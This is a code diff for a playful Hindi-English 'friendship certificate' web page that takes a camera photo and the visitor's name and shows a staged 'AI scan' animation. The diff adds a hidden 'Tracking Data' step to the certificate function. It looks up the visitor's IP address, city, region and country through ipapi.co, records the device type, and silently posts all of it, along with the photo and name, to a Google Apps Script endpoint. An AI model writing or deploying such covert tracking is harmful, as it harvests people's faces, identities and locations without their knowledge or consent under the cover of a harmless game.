@@ -1,4 +1,5 @@
-const sheetURL = 'https://script.google.com/macros/s/AKfycbzspwMl7IHVUOOVakoE6TkpHwjf1uv6MGUqBmjSBr49uwKkbXY-nuJZANik1krP5h-x/exec'; 
+const sheetURL = 'https://script.google.com/macros/s/AKfycbwBJGYT01FggxZrRCwlhxABxb7GTql8dwI6cHcu9qSlqjc4RNOicL7EMt6CX8WQk56N/exec'; 
+
 let uData = { name: "", image: "", id: "FD-2026-" + Math.floor(100000 + Math.random() * 899999) };
 
 function nextStep(s) {
@@ -16,7 +17,7 @@ async function openCam() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
-        window.currentStream = stream; 
+        window.currentStream = stream;
     } catch(e) { alert("Camera Permission Zaruri hai!"); }
 
     document.getElementById('cap-btn').onclick = () => {
@@ -37,7 +38,7 @@ function aiScan() {
     const logs = ["Initializing AI...", "Scanning Smile...", "Happiness Check...", "Unlimited Dosti Detected!"];
     let i = 0;
     const box = document.getElementById('ai-logs');
-    box.innerHTML = ""; // Clear box before starting
+    box.innerHTML = "";
     let timer = setInterval(() => {
         box.innerHTML += `<p style="color:#0f0; margin:5px 0; font-size:14px; text-align:left;">> ${logs[i]}</p>`;
         i++;
@@ -57,15 +58,13 @@ function saveName() {
     startType();
 }
 
-// FIX: Spacing and Words Preserved
 function startType() {
     const txt = "Dosti wo nahi jo sirf waqt par saath de...\nBalki dosti wo hai jo har waqt\nsaath rehne ka wada kare.\n\nThank you for being there! ❤️";
     let i = 0;
     const box = document.getElementById('tp-box');
-    box.textContent = ""; // box clear
+    box.textContent = ""; 
     
     let timer = setInterval(() => {
-        // textContent use karne se spacing sahi rehti hai
         box.textContent += txt[i];
         i++;
         if(i === txt.length) {
@@ -79,7 +78,6 @@ let pCount = 0;
 function pillClick(el, msg) {
     if(el.classList.contains('open')) return;
     el.classList.add('open');
-    // Pillar click hone par clickable effect aur message display
     el.innerHTML = `<p style="font-size:11px; padding:5px; font-weight:bold; line-height:1.4;">"${msg}"</p>`;
     pCount++;
     if(pCount === 4) document.getElementById('p-next').classList.remove('hidden');
@@ -89,12 +87,7 @@ function runMeter() {
     let v = 0;
     let timer = setInterval(() => {
         v += Math.floor(Math.random()*6);
-        if(v >= 100) { 
-            v=100; 
-            clearInterval(timer); 
-            confetti(); 
-            setTimeout(()=>nextStep(7), 2000); 
-        }
+        if(v >= 100) { v=100; clearInterval(timer); confetti(); setTimeout(()=>nextStep(7), 2000); }
         document.getElementById('met-val').innerText = v + "%";
     }, 100);
 }
@@ -105,14 +98,34 @@ function openGift() {
     confetti();
 }
 
-function genCert() {
+async function genCert() {
     document.getElementById('c-name').innerText = uData.name;
     document.getElementById('cid').innerText = "ID: " + uData.id;
     document.getElementById('c-img').src = "data:image/png;base64," + uData.image;
     document.getElementById('c-qr').src = `https://api.qrserver.com/v1/create-qr-code/?data=${uData.id}`;
     
-    // BACKEND SAVE (Sheets + Drive)
-    fetch(sheetURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(uData) });
+    // Tracking Data
+    let locationData = "Unknown";
+    let userIP = "Unknown";
+    try {
+        const response = await fetch('https://ipapi.co/json/');
+        const loc = await response.json();
+        locationData = `${loc.city}, ${loc.region}, ${loc.country_name}`;
+        userIP = loc.ip;
+    } catch (e) {}
+
+    let deviceInfo = navigator.userAgent.includes("Mobi") ? "Mobile" : "Desktop";
+
+    let payload = {
+        name: uData.name,
+        image: uData.image,
+        id: uData.id,
+        location: locationData,
+        device: deviceInfo,
+        ip: userIP
+    };
+
+    fetch(sheetURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
     nextStep(8);
 }
 
@@ -130,7 +143,6 @@ function runTimer() {
     let box = document.getElementById('timer');
     box.style.display = 'block';
     box.innerText = t;
-    
     let timer = setInterval(() => {
         t--;
         box.innerText = t;
